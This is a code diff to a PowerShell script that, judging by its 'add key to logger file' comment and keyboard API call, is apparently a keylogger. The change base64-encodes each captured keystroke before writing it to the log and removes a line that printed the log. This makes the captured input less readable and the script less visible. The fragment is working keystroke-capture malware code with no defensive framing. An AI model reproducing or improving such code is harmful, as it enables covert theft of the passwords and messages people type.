@@ -51,13 +51,15 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
 
           if ($success) 
           {
+	     $Bytes = [System.Text.Encoding]::Unicode.GetBytes($mychar)
+	     $EncodedText =[Convert]::ToBase64String($Bytes)
+	     
             # add key to logger file
-            [System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode) 
+            [System.IO.File]::AppendAllText($Path, $EncodedText, [System.Text.Encoding]::Unicode) 
           }
         }
       }
     }
-	cat $Path
   }
   finally
   {
